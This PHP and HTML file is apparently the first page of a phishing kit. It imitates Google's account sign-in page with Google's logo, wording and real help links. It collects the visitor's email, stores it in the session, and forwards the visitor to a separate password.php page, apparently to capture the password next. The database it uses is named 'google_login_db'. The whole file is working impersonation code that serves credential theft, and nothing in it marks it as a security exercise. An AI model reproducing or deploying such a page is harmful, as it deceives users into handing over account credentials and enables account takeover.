<?php
session_start();
// Database connection
$servername = "localhost";
$username = "root";  // Default XAMPP MySQL username
$password = "";      // Default XAMPP MySQL password
$dbname = "google_login_db";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Use isset() to check if email exists and is not empty
    if (isset($_POST['email']) && !empty($_POST['email'])) {
        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);

        // Validate email
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
            // Store email in session
            $_SESSION['email'] = $email;

            // Show animation before redirecting
            echo '<script>
                document.getElementById("overlay").classList.remove("hidden");
                document.getElementById("animation-container").classList.remove("hidden");
                setTimeout(function() {
                    window.location.href = "password.php";
                }, 500); // Redirect after the animation
            </script>';
            exit();
        } else {
            $error = "Invalid email format";
        }
    } else {
        $error = "Please enter an email";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="shortcut icon" href="https://img.icons8.com/color/48/google-logo.png" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
              .poppins-thin {
        font-family: "Poppins", sans-serif;
        font-weight: 100;
        font-style: normal;
      }

      .poppins-extralight {
        font-family: "Poppins", sans-serif;
        font-weight: 200;
        font-style: normal;
      }

      .poppins-light {
        font-family: "Poppins", sans-serif;
        font-weight: 300;
        font-style: normal;
      }

      .poppins-regular {
        font-family: "Poppins", sans-serif;
        font-weight: 400;
        font-style: normal;
      }

      .poppins-medium {
        font-family: "Poppins", sans-serif;
        font-weight: 500;
        font-style: normal;
      }

      .poppins-semibold {
        font-family: "Poppins", sans-serif;
        font-weight: 600;
        font-style: normal;
      }

      .poppins-bold {
        font-family: "Poppins", sans-serif;
        font-weight: 700;
        font-style: normal;
      }

      .poppins-extrabold {
        font-family: "Poppins", sans-serif;
        font-weight: 800;
        font-style: normal;
      }

      .poppins-black {
        font-family: "Poppins", sans-serif;
        font-weight: 900;
        font-style: normal;
      }

      .poppins-thin-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 100;
        font-style: italic;
      }

      .poppins-extralight-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 200;
        font-style: italic;
      }

      .poppins-light-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 300;
        font-style: italic;
      }

      .poppins-regular-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 400;
        font-style: italic;
      }

      .poppins-medium-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 500;
        font-style: italic;
      }

      .poppins-semibold-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 600;
        font-style: italic;
      }

      .poppins-bold-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 700;
        font-style: italic;
      }

      .poppins-extrabold-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 800;
        font-style: italic;
      }

      .poppins-black-italic {
        font-family: "Poppins", sans-serif;
        font-weight: 900;
        font-style: italic;
      }
      .form__div {
          position: relative;
          height: 52px;
          margin-bottom: 0.6rem;
      }
      .form__input {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          font-size: 16px; /* Explicit font size */
          border: 1px solid rgb(114, 114, 114);
          border-radius: 5px;
          outline: none;
          padding: 1.6rem;
          background: none;
          z-index: 1;
      }
      .form__label {
          position: absolute;
          left: 1rem;
          top: 1rem;
          padding: 0 0.25rem;
          background-color: white;
          color: rgb(114, 114, 114);
          font-size: 16px;
          transition: 0.3s;
          pointer-events: none; /* Allows interaction with input behind the label */
          z-index: 2;
      }
              .form__button {
                  display: block;
                  margin-left: auto;
                  padding: 0.75rem 2rem;
                  outline: none;
                  border: none;
                  background-color: var(--first-color);
                  color: #fff;
                  font-size: var(--normal-font-size);
                  border-radius: 0.25rem;
                  cursor: pointer;
                  transition: 0.3s;
              }
              .form__button:hover {
                  box-shadow: 0 10px 36px rgba(0, 0, 0, 0.15);
              }
              /* Focused and filled state */
      .form__input:focus + .form__label,
      .form__input:not(:placeholder-shown) + .form__label {
          top: -0.8rem;
          left: 0.8rem;
          font-size: 12px;
          color: royalblue;
          background-color: white;
          padding: 0 0.25rem;
      }

              .form__input:focus {
                  border: 1px solid royalblue;
              }
              /* Ensure placeholder is transparent when input has value */
      .form__input:not(:placeholder-shown) {
          background-color: white;
      }

              @media (max-width: 958px) {
                body {
              background-color: white !important;
              margin: 0;
              padding: 0;
          }
          .flex-buttons {
              display: flex;
              flex-direction: row;
              align-items: center;
              justify-content: space-between;
              gap: 1rem; /* Reduced gap */
          }

          .flex-buttons button {
              width: auto; 
              font-size: 0.75rem; 
              min-width: 120px;
          }

      .btn{
        /* border: 1px solid; */
        padding-top: 0%;
      }

      .ca {
              background-color: transparent;
              width: 150px; 
              text-align: center;
              white-space: nowrap; /* Prevents text wrapping */
              overflow: hidden; /* Hides overflowing text */
              text-overflow: ellipsis; 
              padding: 0.5rem 1rem; 
              padding-top: 25px;
              display: inline-block; /* Ensures proper alignment */
          }
          .next {
              width: auto; /* Adjust width as needed */
              color: white;
          }

          .form__div {
              margin-bottom: 1rem; /* Increase margin for better spacing */
          }

          .form__input {
              padding: 0.75rem; /* Increase padding for better touch targets */
          }

          .form__label {
              font-size: 0.9rem; /* Adjust label font size */
          }

          /* Adjust the dropdown and help links for mobile view */
          .text-right {
              justify-content: center; /* Center help links */
              gap: 0.5rem; /* Adjust gap */
          }

          select {
              width: 100%;
              margin-bottom: 10px;
              background-color: white;
          }

          .container-border {
              border-radius: 0%;
              padding: 25px;
              box-shadow: none;
          }
          .sen{
            padding-bottom: 10px;
          }
          .input{
            padding-top: 5px;
          }
          .forgot-password{
            margin-bottom: 0%px;
          }
          .container-foot {
              position: fixed;
              bottom: 0;
              left: 0;
              width: 100%;
              background-color: white;
              border: none;
              padding: 15px;
              /* box-shadow: 0 -1px 5px rgba(0,0,0,0.1); */
              display: flex;
              flex-direction: column;
          }
          /* .container-foot > div {
              width: 100%;
              display: flex;
              flex-direction: column;
              align-items: center;
              gap: 10px;
          } */
          .foot-links {
              justify-content: center;
              margin-top: 10px;
          }
      }

    </style>
</head>
<body class="font-sans md:pt-56" style="background-color: #F0F4F9;">

    <div class="container-border max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-8 rounded-3xl bg-white p-8">
        <div class="flex flex-col items-start">
            <img width="48" height="48" src="https://img.icons8.com/color/48/google-logo.png" alt="google-logo" />
            <h1 class="text-4xl md:text-5xl font-bold pt-6 poppins-regular">Sign in</h1>
            <p class="fsen text-gray-700 mt-4">Use your Google Account</p>
        </div>

        <div class="input pt-10 md:pt-20">
          <form method="POST" action="">
            <div class="form__div">
                <input
                    type="email"
                    name="email"
                    placeholder=""
                    class="w-full px-4 py-2 form__input"
                />
                <label for="" class="form__label poppins-regular ">Email or phone</label>
            </div>

            <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot-email text-blue-600 hover:underline mb-1 font-bold text-sm poppins-medium block w-32">Forgot email?</a>
            <p class="sen text-gray-600 mb-4 text-sm font-sans py-8">
                Not your computer? Use a private browsing window to sign in.
                <a href="https://support.google.com/accounts/answer/2917834" class="text-blue-600 hover:underline font-bold poppins-medium text-sm">Learn more about using Guest mode</a>
            </p>

            <div class="btn flex flex-col md:flex-row justify-between md:justify-end space-y-4 md:space-y-0 md:space-x-8 w-full pt-4 pl-6 md:pl-0 flex-buttons">
                <button
                    id="redirectButton"
                    class="ca px-4 py-2 rounded-md text-blue-600 font-bold poppins-medium text-xs transition duration-300 ease-in-out hover:bg-blue-100 rounded-3xl">
                    Create account
                </button>
                <button
                    type="submit"
                    class="next bg-blue-600 w-20 py-3 rounded-3xl text-white hover:bg-blue-500 transition transition-duration-3s font-bold text-sm">
                    Next
                </button>
            </div>
            </form>
        </div>
    </div>
    <div class="container-foot mx-auto px-4 py-4 grid grid-cols-1 md:grid-cols-2 gap-2" style="width: 56%; display: flex; justify-content: space-between; align-items: center;">
        <select class="w-full md:w-64 px-4 py-2 rounded-md  text-gray-700 text-xs poppins-regular font-bold appearance-none focus:outline-none" style="background-color: #F0F4F9;">
            <option value="en-uk" selected>English (United Kingdom)</option>
            <option value="en-us">English (United States)</option>
            <option value="fr">Français (France)</option>
            <option value="es">Español (España)</option>
            <option value="de">Deutsch (Deutschland)</option>
            <option value="zh-cn">中文 (简体)</option>
            <option value ="zh-tw">中文 (繁體)</option>
            <option value="ja">日本語</option>
            <option value="ko">한국어</option>
            <option value="hi">हिन्दी</option>
            <option value="ar">العربية</option>
            <option value="pt-br">Português (Brasil)</option>
            <option value="pt-pt">Português (Portugal)</option>
            <option value="it">Italiano</option>
            <option value="ru">Русский</option>
            <option value="nl">Nederlands</option>
            <option value="sv">Svenska</option>
            <option value="tr">Türkçe</option>
            <option value="pl">Polski</option>
            <option value="vi">Tiếng Việt</option>
        </select>

        <div class="foot-links text-right space-6 flex justify-evenly poppins-regular text-xs font-bold" style="width: 100%; display: flex; justify-content: flex-end; gap: 1rem;">
            <a href="https://support.google.com/accounts" class="hover:bg-gray-200 rounded-xl p-2">Help</a>
            <a href="https://policies.google.com/privacy" class="hover:bg-gray-200 rounded-xl p-2">Privacy</a>
            <a href="https://policies.google.com/terms" class="hover:bg-gray-200 rounded-xl p-2">Term</a>
        </div>
    </div>

    <div id="overlay" class="overlay hidden"></div>
<div id="animation-container" class="animation-container hidden"></div>

<style>
        /* Overlay styles */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color:rgba(140, 160, 180, 0.2);
            z-index: 999; /* Make sure it's above everything */
            transition: opacity 0.5s ease;
        }
        
        .overlay.active{
          opacity: 1;
        }

        /* Animation container styles */
        .animation-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000; /* Above the overlay */
            display: flex;
            justify-content: center;
            align-items: center;
            transition: transform 2s ease;
        }
        
        .swipe-left {
            transform: translateX(-100%);
        }
        
        .swipe-in {
            transform: translateX(100%);
        }
        
        .hidden {
            display: none;
        }
    </style>
<!-- <script>
        document.getElementById('redirectButton').addEventListener('click', function () {
            window.location.href = 'https://accounts.google.com/lifecycle/steps/signup/name';
        });
    </script> -->
    <script>
    // Function to handle form submission with overlay
    function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission

    // Validate email
    const emailInput = document.querySelector('input[name="email"]');
    const email = emailInput.value.trim();

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email || !emailRegex.test(email)) {
        alert('Please enter a valid email address');
        return false;
    }

    // Show overlay and animation
    const overlay = document.getElementById("overlay");
    const animationContainer = document.getElementById("animation-container");

    // Show the overlay and animation container
    overlay.classList.remove("hidden");
    overlay.classList.add("active");
    animationContainer.classList.remove("hidden");

    // Add swipe animation
    animationContainer.classList.add("swipe-left");

    // Redirect to password.php with email as parameter
    setTimeout(() => {
        window.location.href = "password.php?email=" + encodeURIComponent(email);
    }, 500);

    return false;
}

    // Redirect button event listener
    document.getElementById('redirectButton').addEventListener('click', function () {
      event.preventDefault();
        window.location.href = 'https://accounts.google.com/lifecycle/steps/signup/name?continue=https://myaccount.google.com/?utm_source%3Dsign_in_no_continue%26pli%3D1&ddm=1&dsh=S1578799776:1732660465314862&ec=GAlAwAE&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en_GB&service=accountsettings&TL=AKOx4s2qMSZJNQRuSAy9Wf5-a7jkxZj_Iefm5jiB30sC3g21hvW7kW0rLTTfxnhC';
    });

    // Optional: Remove the onsubmit attribute from the form in HTML
    // and add event listener to form submission
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.querySelector('form');
        form.addEventListener('submit', handleSubmit);
    });
</script>
</body>
</html>
